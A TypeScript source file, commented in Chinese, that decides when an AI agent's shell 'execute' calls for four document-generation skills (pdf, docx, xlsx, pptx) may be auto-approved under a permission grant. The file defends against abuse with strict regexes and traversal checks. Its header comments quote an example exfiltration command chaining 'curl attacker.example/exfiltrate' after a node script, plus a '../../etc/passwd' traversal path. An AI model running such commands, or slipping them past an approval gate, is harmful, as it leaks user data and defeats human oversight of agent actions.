/**
 * issue #3440 —— 四个平台官方文档 skill（pdf/docx/xlsx/pptx-create）的「已声明工具
 * 清单」+「(skill_name, tool_name) 授权寻址」的唯一事实源。
 *
 * ## 为什么需要这份清单（不是猜的，从真实执行链路取证）
 *
 * #3401/#3403 的 devapp 真机证据（`docs/design/standard-capabilities/evidence/
 * issue-3401/baseline1-timeline.json`、`b21_1-timeline.json` 等）逐字取出四个文档
 * skill 在原生模式（`native_graph.py`）下实际调用的工具名全集：
 *   `read_file`（读 `/skills/<name>/SKILL.md` 与 `references/*.md`）、
 *   `write_file`（把模型现写的生成脚本落到 `/workspace/*.js`）、
 *   `execute`（跑该脚本，以及跑 skill 自带的 `/skills/<name>/scripts/render-office.py`）、
 *   `edit_file`（#3401 `b21_1` 证据：迭代修正已生成脚本时用）。
 * legacy（非原生）模式下这四个 skill 是通过 `call_skill` 这一个工具整体调用的
 * （`deep_agent_service/tools.py` 的唯一有副作用工具）。
 *
 * ## 为什么清单里只有 `execute`（和 legacy 的 `call_skill`）真正参与授权判定
 *
 * `tool-risk-tier.ts` 是风险分级的唯一事实源：`read_file` 是 L0，`write_file`/
 * `edit_file` 是 L1——两档都不会触发 `awaiting_tool_permission`（只有 L2 会）。
 * 四个文档 skill 清单里唯一的 L2 工具是 `execute`（原生模式）与 `call_skill`
 * （legacy 模式，`classifyToolCallRisk` 按目标 skill 判）。本文件因此只对这两个
 * 工具名计算"是否可归因到某个已声明清单里的 skill"，其余工具名不需要判定——不是
 * 遗漏，是它们本就不在 L2 那一档，见上面的分级表。
 *
 * ## (skill_name, tool_name) 寻址 —— #3221 的局部、范围受限修复
 *
 * #3221 的根因：`tool-permission-gate.ts` 此前用裸 `toolName`（对所有 `call_skill`
 * 调用都是同一个字符串）去查/写授权，于是批准一个 skill 会连带放行本 run 内所有其它
 * L2 skill。本文件只把这条修法应用在四个已知可信的文档 skill 上（`resolveGrantAddress`
 * 把地址从裸 `"call_skill"` 收紧成 `"call_skill:pdf-create"` 这样的 skill 限定串）——
 * 不是 #3221 的全量修复：其余 skill 之间是否互相泄漏授权，本文件不处理，仍是已知、
 * 留档的范围外问题。这条修复与下面"调用口径"改造无关，PR #3447 第一版已经做对，
 * 本次重新设计原样保留、不改一行。
 *
 * ## 重新设计（人类 2026-09-11 实测裁决）—— 从"挂载口径"换成"调用口径"
 *
 * 第一版 `resolveNativeExecuteAttribution` 按**本次 run 挂载的 skill 集合**判定：只有
 * 挂载了且只挂载了一个锁定 skill、且没有挂载任何其它非 L0 skill 时才归因。#3437 用
 * devapp 真机 run 34601392370 证明了这个前提在生产条件下几乎恒为 false（典型账号一次
 * 会话挂载 21 个 skill，4 官方 + 17 默认 L1）——人类实测后原话「推翻之前的设计，要以
 * 用户体验为优先级」，裁决重新设计。
 *
 * 新判定看的不是"这个 run 挂载了什么"，是"这个 run 里这次 `execute` 调用是不是由
 * 已批准的那条文档技能调用链引出的"——**混挂本身不再是假阴性来源**：只要这次 `execute`
 * 调用在因果上确实是那条文档任务链产出的，其它挂载但没被用到的 skill 不影响判定
 * （`resolveNativeExecuteAttribution` 的 `priorToolCallSteps` 只看**这个 run 里真实
 * 发生过的工具调用**，不看挂载集合，挂载集合参数已经从入参里整个去掉）。
 *
 * ### 判定依据：`/skills/<stableName>/...` 路径是"skill 被实际调用"的信号，不是挂载
 *
 * `baseline1-timeline.json` 逐字证据：`read_file` 的第一次调用 `args.file_path` 是
 * `/skills/pdf-create/SKILL.md`——这条路径本身就是"模型选择了这个 skill、正在读它"
 * 这件事的直接证据,不依赖任何"挂载了什么"的旁路推断。`extractSkillPathStableName`
 * 从 `read_file`/`write_file`/`edit_file` 的 `file_path` 与 `execute` 的 `command`
 * 里抠这个前缀；`call_skill`（legacy）直接读 `skill_stable_name` 显式参数
 * （`calledSkillStableName` 在 `application/agent-run/called-skill-display-name.ts`
 * 里已经这样解析过一次——这里不 import 它：`domain` 不得依赖 `application`
 * （`lint-arch-deps.mjs`，ADR-020），两行 JSON 解析重复一次比破坏分层方向更便宜，
 * `skill-risk-level.ts` 头注已经用同一条理由这样做过）。
 *
 * ### 收紧条件（不能退化成"批过一次全场通行"）
 *
 * 1. 触发技能必须是四个已锁定文档 skill 之一——`isDocumentGenerationSkillName` 判定，
 *    与第一版逐字相同。
 * 2. 免确认覆盖的原语被锁死在两类：(a) 这四个 skill 自己声明的清单里的
 *    `read_file`/`write_file`/`edit_file`——本来就是 L0/L1，从不触发确认，不需要这里
 *    判定；(b) `execute`，但**不是任意命令**——`isAllowedDocumentGenerationExecuteCommand`
 *    只放行三种形状：跑该 skill 自己的 `/skills/<stableName>/scripts/*` 脚本；
 *    `cd /workspace && node|python3 <相对文件名>`（`baseline1-timeline.json` 与 #3437
 *    `assistant-capabilities.js` 的真实形状——`cd` 之后脚本路径是相对文件名）；或者
 *    不带 `cd` 前缀、直接给 `node|python3 /workspace/*` 绝对路径。命令字符串必须整体
 *    匹配（`^...$`）且不含 `..`，不允许 `;`/`|`/反引号/`$(`/重定向——见下面"漏洞与收紧"
 *    一节，这是本次重新设计新增的边界，第一版没有。
 * 3. **调用口径的核心安全闸**：扫描这个 run 迄今为止（`priorToolCallSteps`）真实发生
 *    过的每一次工具调用，只要有一次指向**四个锁定 skill 之外**的、风险等级非 `L0`
 *    的 skill，整个归因立刻失败（`null`）——不区分这次"污染"发生在目标 execute 调用
 *    之前还是之后（判定时污染只可能在之前，因为当前这次 execute 还没执行、还没落
 *    `agent_run_steps`），也不因为"已经批准过一次"就放行：这正是 #3221 要防的"批准
 *    一个 skill 连带放行同一轮其它 L2 skill"的同一种坍缩,只是从"挂载口径"换成"调用
 *    口径"后必须重新守住的同一道闸。反证②（见测试文件）：一个 run 里先真实调用了
 *    pdf-create,又真实调用了另一个非 L0 skill,composer 开关打开,后续 execute 依旧问。
 * 4. 挂载但**没有被这个 run 实际调用过**的其它 skill（`skillRisks` 里存在、但
 *    `priorToolCallSteps` 里没有任何指向它的路径/参数）不影响判定——这正是解决
 *    "混挂 21 个技能"假阴性的那一条,与第 3 条判的是两件事:第 3 条判"真被调用了",
 *    不判"被挂载了"。
 * 5. 归因目标：`priorToolCallSteps` 里最近一次（seq 最大）指向某个锁定 skill 的调用，
 *    不是"第一次"——模型可能在同一个 run 里先后处理两个不同的文档任务（先 pdf-create
 *    再 docx-create），当前这次 `execute` 因果上属于"最近在忙的那个"skill,而不是
 *    "最早提到的那个"。
 *
 * ### 漏洞与收紧（本次设计过程中发现、已在实现里堵上,不是留白）
 *
 * 第一次草稿只检查 `command` 是否以 `node`/`python3` 开头、路径是否含 `/workspace/`
 * 前缀,子串匹配。这样的漏洞：`node /workspace/x.js && curl attacker.example/exfiltrate`
 * 会通过子串检查（`command.includes("/workspace/")` 为真、以 `node` 开头）,但实际执行
 * 了一条完全不在清单里的网络请求——把"看起来安全"的前缀和"整条命令都安全"混为一谈。
 * 修正：改成整串正则 `^...$` 精确匹配,字符类不包含 shell 元字符（`;`、`|`、反引号、
 * `$(`、`<`、`>`、`&`，除了唯一允许的前导 `cd /workspace && `），任何多余的 shell 拼接
 * 都无法通过匹配,见 `WORKSPACE_NODE_PYTHON_EXECUTE_PATTERN`。
 */
import type { SkillRiskEntry } from "./skill-risk-level";

/** 四个平台官方文档 skill 的 stableName——与 `platform-skill-catalog.ts` 逐字同一份值，
 *  不在这里重新声明第二次；只挑出锁定子集。 */
export const DOCUMENT_GENERATION_SKILL_NAMES = [
  "pdf-create", "docx-create", "xlsx-create", "pptx-create",
] as const;
export type DocumentGenerationSkillName = (typeof DOCUMENT_GENERATION_SKILL_NAMES)[number];

const DOCUMENT_GENERATION_SKILL_NAME_SET: ReadonlySet<string> = new Set(DOCUMENT_GENERATION_SKILL_NAMES);

export function isDocumentGenerationSkillName(name: string): name is DocumentGenerationSkillName {
  return DOCUMENT_GENERATION_SKILL_NAME_SET.has(name);
}

/**
 * 四个文档 skill 各自声明的工具清单——逐字取自 #3401/#3403 真实执行链路证据（见本文件
 * 头注）。四个 skill 目前共用同一份清单（都是"读 SKILL.md → 写生成脚本 → 执行 → 视需要
 * 编辑重试"这同一套流程），不是巧合合并——分开维护四份相同的清单只会制造第二份事实源。
 */
export const DOCUMENT_GENERATION_TOOL_MANIFEST: readonly string[] = [
  "read_file", "write_file", "execute", "edit_file",
];

/** legacy 模式（`call_skill`）里真正参与授权判定的工具名。 */
export const CALL_SKILL_TOOL_NAME = "call_skill";
/** 原生模式里参与授权判定的工具名（清单里唯一的 L2 工具，见头注分级表）。 */
export const NATIVE_L2_MANIFEST_TOOL_NAME = "execute";

/**
 * composer 开关「自动批准文档生成所需权限」落地成的组织级 standing grant 地址
 * （`tool_permission_grants.tool_name` 的值）——刻意与任何真实工具名不同形（含冒号），
 * 不会与任何工具的裸授权地址碰撞。
 */
export const DOCUMENT_GENERATION_AUTO_APPROVE_GRANT_ADDRESS = "document_generation:auto_approve";

/**
 * legacy `call_skill` 中断的授权寻址：目标 skill 在锁定清单内 ⇒ 收紧成
 * `call_skill:<stableName>`（#3221 的局部修复，见头注）；否则 `null`（不归因，
 * 调用方应退回裸 `toolName` 寻址，行为与本 feature 之前逐字相同）。
 */
export function resolveCallSkillGrantAddress(skillStableName: string | null | undefined): string | null {
  if (typeof skillStableName !== "string" || !isDocumentGenerationSkillName(skillStableName)) return null;
  return `${CALL_SKILL_TOOL_NAME}:${skillStableName}`;
}

/** `tool-permission-gate.ts` 传入的、这个 run 迄今为止真实发生过的一次工具调用——
 *  只需要归因判定要用的两个字段，见 `AgentRunStore.readToolCallAttributionSteps`。 */
export interface RunToolCallStepForAttribution {
  readonly toolName: string;
  readonly toolArgsSummary: string | null;
}

/** legacy `call_skill` 第一个参数的 wire 名——与 `deep_agent_service/tools.py` 的签名、
 *  与 `application/agent-run/called-skill-display-name.ts` 的同名常量逐字一致（那处是
 *  application 层，这里不 import 它，见本文件头注"判定依据"一节）。 */
const CALL_SKILL_STABLE_NAME_ARG = "skill_stable_name";

/** 从一次 `call_skill` 调用的 `toolArgsSummary`（JSON 字符串）里抠 `skill_stable_name`。
 *  解析失败/字段缺席/空串一律返回 `null`——不猜。 */
function extractCallSkillStableName(argsSummary: string | null): string | null {
  if (argsSummary === null || argsSummary === "") return null;
  let parsed: unknown;
  try {
    parsed = JSON.parse(argsSummary);
  } catch {
    return null;
  }
  const value = (parsed as Record<string, unknown> | null)?.[CALL_SKILL_STABLE_NAME_ARG];
  return typeof value === "string" && value.trim() !== "" ? value.trim() : null;
}

/** `/skills/<stableName>/...` 路径前缀——原生模式里"这个 skill 被实际调用了"的信号。 */
const SKILLS_PATH_PATTERN = /\/skills\/([a-z0-9][a-z0-9-]*)\//;

/**
 * 从原生模式一次工具调用（`read_file`/`write_file`/`edit_file` 的 `file_path`，或
 * `execute` 的 `command`）里抠 `/skills/<stableName>/` 路径前缀，得到"这次调用触达的
 * 那个 skill"。抠不到（比如 `execute` 只碰了 `/workspace/*`）返回 `null`——那不代表
 * 没有 skill 被调用，只代表这一步本身不是"进那个 skill 目录"的信号，调用方按"这一步
 * 不参与归因"处理，不是"没有 skill"。
 */
function extractSkillPathStableName(argsSummary: string | null): string | null {
  if (argsSummary === null || argsSummary === "") return null;
  let parsed: unknown;
  try {
    parsed = JSON.parse(argsSummary);
  } catch {
    return null;
  }
  const obj = parsed as Record<string, unknown> | null;
  const candidates = [obj?.["file_path"], obj?.["command"]].filter(
    (value): value is string => typeof value === "string",
  );
  for (const text of candidates) {
    const match = SKILLS_PATH_PATTERN.exec(text);
    if (match?.[1] !== undefined) return match[1];
  }
  return null;
}

/**
 * 一次工具调用"触达的 skill"——`call_skill` 按显式参数判，其余原生工具按路径前缀判。
 * `null` = 这一步不携带任何可判定的 skill 身份（比如纯 `/workspace/` 操作），不参与
 * 归因判定的"污染检测"，也不参与"最近一次锁定 skill"的候选。
 */
function extractTouchedSkillStableName(step: RunToolCallStepForAttribution): string | null {
  if (step.toolName === CALL_SKILL_TOOL_NAME) return extractCallSkillStableName(step.toolArgsSummary);
  return extractSkillPathStableName(step.toolArgsSummary);
}

/** 提取 `execute` 中断的 `command` 参数——归因目标已经确定后，还要看这条命令本身是否
 *  落在被批准覆盖的范围内（见头注"收紧条件"第 2 条）。解析不到一律 `null`（不放行）。 */
function extractExecuteCommand(argsSummary: string | null): string | null {
  if (argsSummary === null || argsSummary === "") return null;
  let parsed: unknown;
  try {
    parsed = JSON.parse(argsSummary);
  } catch {
    return null;
  }
  const value = (parsed as Record<string, unknown> | null)?.["command"];
  return typeof value === "string" && value.trim() !== "" ? value : null;
}

/**
 * `execute` 免确认覆盖的命令形状——整串正则匹配（`^...$`），不是子串检查，字符类里
 * 不含任何 shell 元字符（`;`/`|`/反引号/`$(`/`<`/`>`/`&`，除了唯一允许的前导
 * `cd /workspace && `）。见本文件头注"漏洞与收紧"一节：子串检查曾经放行
 * `node /workspace/x.js && curl attacker.example`，这条正则不会。
 *
 * 放行三种形状（都逐字取自真实证据）：
 *   (a) 该 skill 自己声明的脚本：`node`/`python3 /skills/<stableName>/scripts/<file> [args]`
 *       （`baseline1-timeline.json` 证据：`python3 /skills/pdf-create/scripts/
 *       render-office.py /workspace/x.pdf /workspace/preview`）；
 *   (b) `cd /workspace && ` 之后跑一个相对当前目录的临时脚本：`node|python3 <file> [args]`
 *       （`baseline1-timeline.json` 证据、#3437 反例 `assistant-capabilities.js` 的真实
 *       形状都是这样——`cd` 之后脚本路径是相对文件名，不是再重复一遍 `/workspace/` 前缀）；
 *   (c) 不带 `cd` 前缀、直接给绝对路径：`node|python3 /workspace/<file> [args]`。
 * 相对路径（形状 b）首字符必须是 `\w`（字母/数字/下划线），排斥以 `.` 开头的路径——
 * 挡掉 `../../etc/passwd` 这类开局就想跳出 `/workspace` 的写法；命令里任何位置出现
 * `..`（目录穿越）一律直接拒绝，不管落在正则的哪个分组里，见 `containsPathTraversal`。
 * 参数（脚本路径后的其余 token）限定在 `[\w./-]+`——足以覆盖真实证据里的文件路径参数，
 * 不接受任何空格外的分隔符或特殊字符。
 */
const ARG_TOKEN = "[\\w./-]+";
/** `cd /workspace && ` 之后的脚本路径——相对文件名（形状 b）或显式 `/workspace/` 绝对
 *  路径（等价于形状 c，`cd` 前缀不影响判定，多接受一种写法而已）。 */
const RELATIVE_OR_WORKSPACE_PATH = `(?:/workspace/${ARG_TOKEN}|[\\w][\\w./-]*)`;
const WORKSPACE_NODE_PYTHON_EXECUTE_PATTERN = new RegExp(
  `^cd /workspace && (?:node|python3) ${RELATIVE_OR_WORKSPACE_PATH}(?: ${ARG_TOKEN})*$`,
);
const WORKSPACE_ABSOLUTE_NODE_PYTHON_EXECUTE_PATTERN = new RegExp(
  `^(?:node|python3) /workspace/${ARG_TOKEN}(?: ${ARG_TOKEN})*$`,
);

/** 目录穿越防线——独立于正则的字符类之外，命令字符串里任何位置出现 `..` 一律拒绝。
 *  见本文件头注"漏洞与收紧"一节：字符类本身挡不住 `sub/../../etc/passwd` 这种中段
 *  穿越（首字符检查只挡得住开局的 `..`），需要单独的子串检查兜底。 */
function containsPathTraversal(command: string): boolean {
  return command.includes("..");
}

function isAllowedDocumentGenerationExecuteCommand(
  command: string,
  skillStableName: DocumentGenerationSkillName,
): boolean {
  if (containsPathTraversal(command)) return false;
  if (WORKSPACE_NODE_PYTHON_EXECUTE_PATTERN.test(command)) return true;
  if (WORKSPACE_ABSOLUTE_NODE_PYTHON_EXECUTE_PATTERN.test(command)) return true;
  const skillScriptPattern = new RegExp(
    `^(?:node|python3) (/skills/${skillStableName}/scripts/${ARG_TOKEN})(?: ${ARG_TOKEN})*$`,
  );
  return skillScriptPattern.test(command);
}

/**
 * 原生模式 `execute` 中断的归因（重新设计，见本文件头注"重新设计"一节）——调用口径，
 * 不是挂载口径。
 *
 * @param priorToolCallSteps 这个 run 迄今为止真实发生过的工具调用，按 `seq` 升序（当前
 *   这次被中断的 `execute` 调用本身**不在**这个列表里——中断发生在执行前，这次调用还
 *   没有落 `agent_run_steps`，见 `AgentRunStore.readToolCallAttributionSteps` 头注）。
 * @param skillRisks 本次 run 挂载集合的风险分级——只用来判定"污染检测"里那个非锁定
 *   skill 是不是 L0（L0 不算污染）；不再用来判定"挂载了几个 skill"。
 * @param executeArgsSummary 当前这次 `execute` 中断本身的 `argsSummary`——归因目标定下
 *   来之后，还要看这条命令是否落在覆盖范围内。
 */
export function resolveNativeExecuteAttribution(
  priorToolCallSteps: readonly RunToolCallStepForAttribution[],
  skillRisks: readonly SkillRiskEntry[],
  executeArgsSummary: string | null,
): DocumentGenerationSkillName | null {
  const command = extractExecuteCommand(executeArgsSummary);
  if (command === null) return null;

  let attributedSkill: DocumentGenerationSkillName | null = null;
  for (const step of priorToolCallSteps) {
    const touched = extractTouchedSkillStableName(step);
    if (touched === null) continue;
    if (isDocumentGenerationSkillName(touched)) {
      attributedSkill = touched;
      continue;
    }
    // 污染检测（收紧条件第 3 条）：触达了锁定清单之外的 skill，且不是 L0——查不到风险
    // 等级（未挂载在 `skillRisks` 里也可能发生：比如已经被内核清点为一次调用但读取
    // 风险表时出于某种原因缺了这条）一律按 L2 处理，fail closed，不默认放行。
    const riskLevel = skillRisks.find((entry) => entry.stableName === touched)?.riskLevel ?? "L2";
    if (riskLevel !== "L0") return null;
  }

  if (attributedSkill === null) return null;
  if (!isAllowedDocumentGenerationExecuteCommand(command, attributedSkill)) return null;
  return attributedSkill;
}

/**
 * 原生模式 `execute` 归因命中后的授权寻址：`execute:<stableName>`。与
 * `resolveCallSkillGrantAddress` 的地址形状一致（`<toolName>:<skillStableName>`），
 * 两条路径共用同一套读/写代码，不需要 `tool-permission-gate.ts` 区分 legacy/native。
 */
export function resolveNativeExecuteGrantAddress(skillStableName: DocumentGenerationSkillName): string {
  return `${NATIVE_L2_MANIFEST_TOOL_NAME}:${skillStableName}`;
}

/**
 * `tool-permission-gate.ts` 的唯一入口：给定这次中断的 `toolName` +（legacy 才有的）
 * `skillStableName` +（原生 `execute` 才用得到的）这个 run 迄今为止的工具调用序列 +
 * 本次 run 挂载的 `skillRisks` + 这次中断自身的 `argsSummary`，算出"这次调用是否可
 * 归因到四个锁定文档 skill 之一"，能就返回收紧后的授权地址，不能就返回 `null`
 * （调用方据此退回裸 `toolName`，即"清单之外一律照旧"——I-1 的延伸）。
 */
export function resolveDocumentGenerationGrantAddress(
  toolName: string,
  skillStableName: string | null | undefined,
  skillRisks: readonly SkillRiskEntry[],
  priorToolCallSteps: readonly RunToolCallStepForAttribution[] = [],
  argsSummary: string | null = null,
): string | null {
  if (toolName === CALL_SKILL_TOOL_NAME) return resolveCallSkillGrantAddress(skillStableName);
  if (toolName === NATIVE_L2_MANIFEST_TOOL_NAME) {
    const attributed = resolveNativeExecuteAttribution(priorToolCallSteps, skillRisks, argsSummary);
    return attributed === null ? null : resolveNativeExecuteGrantAddress(attributed);
  }
  return null;
}
